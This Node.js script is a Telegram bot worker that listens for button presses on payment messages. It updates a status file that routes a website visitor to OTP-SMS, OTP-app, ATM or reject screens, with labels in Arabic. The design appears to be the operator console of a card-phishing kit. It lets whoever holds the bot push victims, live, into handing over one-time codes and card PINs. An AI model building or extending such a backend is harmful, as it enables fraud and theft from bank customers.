#!/usr/bin/env node

const fs = require('fs');
const path = require('path');

const ROOT = __dirname;
const CONFIG_FILE = path.join(ROOT, 'assets/js/config.js');
const STATE_FILE = path.join(ROOT, '.telegram-offset.json');
const PAYMENT_STATUS_FILE = path.join(ROOT, 'payment-status.json');

function readConfigCredentials() {
  try {
    const source = fs.readFileSync(CONFIG_FILE, 'utf8');
    const tokenMatch = source.match(/globalThis\.telegramToken\s*=\s*["']([^"']+)["']/);
    const chatMatch = source.match(/globalThis\.chatId\s*=\s*["']([^"']+)["']/);
    return {
      token: tokenMatch ? tokenMatch[1].trim() : '',
      chatId: chatMatch ? chatMatch[1].trim() : '',
    };
  } catch {
    return { token: '', chatId: '' };
  }
}

function getCredentials() {
  const fileCreds = readConfigCredentials();
  return {
    token: String(process.env.TELEGRAM_BOT_TOKEN || fileCreds.token || '').trim(),
    chatId: String(process.env.TELEGRAM_CHAT_ID || fileCreds.chatId || '').trim(),
  };
}

function readOffset() {
  try {
    const raw = fs.readFileSync(STATE_FILE, 'utf8');
    const parsed = JSON.parse(raw);
    const value = Number(parsed.offset);
    return Number.isFinite(value) && value > 0 ? value : 0;
  } catch {
    return 0;
  }
}

function writeOffset(offset) {
  fs.writeFileSync(STATE_FILE, JSON.stringify({ offset }, null, 2));
}

function writePaymentStatus({ chatId, messageId, status }) {
  const payload = {
    chatId: String(chatId || ''),
    messageId: Number(messageId) || 0,
    status: String(status || ''),
    updatedAt: new Date().toISOString(),
  };
  fs.writeFileSync(PAYMENT_STATUS_FILE, JSON.stringify(payload, null, 2));
}

async function telegramApi(token, method, body) {
  const response = await fetch(`https://api.telegram.org/bot${token}/${method}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  });

  const json = await response.json().catch(() => ({}));
  if (!response.ok || !json.ok) {
    throw new Error(`Telegram API ${method} failed: ${response.status} ${JSON.stringify(json)}`);
  }
  return json;
}

function resolveStatus(callbackData) {
  if (callbackData === 'payment_otp_sms') {
    return 'تحويل إلى OTP-SMS';
  }
  if (callbackData === 'payment_otp_app') {
    return 'تحويل إلى OTP-APP';
  }
  if (callbackData === 'payment_atm') {
    return 'تحويل إلى الصراف الآلي';
  }
  if (callbackData === 'payment_finish') {
    return 'تم الإنهاء';
  }
  if (callbackData === 'payment_reject') {
    return 'تم الرفض';
  }
  return '';
}

async function handleCallback(token, callbackQuery) {
  const id = callbackQuery.id;
  const data = String(callbackQuery.data || '');
  const message = callbackQuery.message;

  const statusText = resolveStatus(data);
  if (!message || !statusText) {
    await telegramApi(token, 'answerCallbackQuery', {
      callback_query_id: id,
      text: 'إجراء غير مدعوم',
      show_alert: false,
    });
    return;
  }

  const chatId = message.chat && message.chat.id;
  const messageId = message.message_id;
  const baseText = String(message.text || '').trim();
  const cleanBase = baseText
    .replace(/\n\nالحالة:\s*(تم الرفض|تحويل إلى OTP-SMS|تحويل إلى OTP-APP|تحويل إلى الصراف الآلي|تم الإنهاء)\s*$/u, '')
    .trim();
  const updatedText = `${cleanBase}\n\nالحالة: ${statusText}`;

  await telegramApi(token, 'editMessageText', {
    chat_id: chatId,
    message_id: messageId,
    text: updatedText,
    disable_web_page_preview: true,
  });

  await telegramApi(token, 'answerCallbackQuery', {
    callback_query_id: id,
    text: statusText,
    show_alert: false,
  });

  writePaymentStatus({
    chatId,
    messageId,
    status:
      data === 'payment_reject'
        ? 'rejected'
        : data === 'payment_otp_sms'
          ? 'otp_sms'
          : data === 'payment_otp_app'
            ? 'otp_app'
            : data === 'payment_atm'
              ? 'atm'
              : data === 'payment_finish'
                ? 'finished'
                : 'unknown',
  });

  console.log(`[callback] chat=${chatId} message=${messageId} status=${statusText}`);
}

async function run() {
  const creds = getCredentials();
  if (!creds.token) {
    throw new Error('Missing Telegram bot token. Set TELEGRAM_BOT_TOKEN or assets/js/config.js.');
  }

  let offset = readOffset();
  if (!offset) {
    try {
      const bootstrap = await telegramApi(creds.token, 'getUpdates', {
        offset: 0,
        timeout: 0,
        allowed_updates: ['callback_query'],
      });
      const latest = (bootstrap.result || []).at(-1);
      if (latest && Number.isFinite(Number(latest.update_id))) {
        offset = Number(latest.update_id) + 1;
        writeOffset(offset);
      }
    } catch (error) {
      console.error('[bootstrap-error]', error.message || error);
    }
  }

  console.log(`Telegram callback worker started. offset=${offset || 0}`);

  while (true) {
    try {
      const result = await telegramApi(creds.token, 'getUpdates', {
        offset,
        timeout: 30,
        allowed_updates: ['callback_query'],
      });

      for (const update of result.result || []) {
        offset = Number(update.update_id) + 1;
        writeOffset(offset);

        if (update.callback_query) {
          await handleCallback(creds.token, update.callback_query);
        }
      }
    } catch (error) {
      console.error('[worker-error]', error.message || error);
      await new Promise((resolve) => setTimeout(resolve, 1500));
    }
  }
}

run().catch((error) => {
  console.error(error.message || error);
  process.exit(1);
});
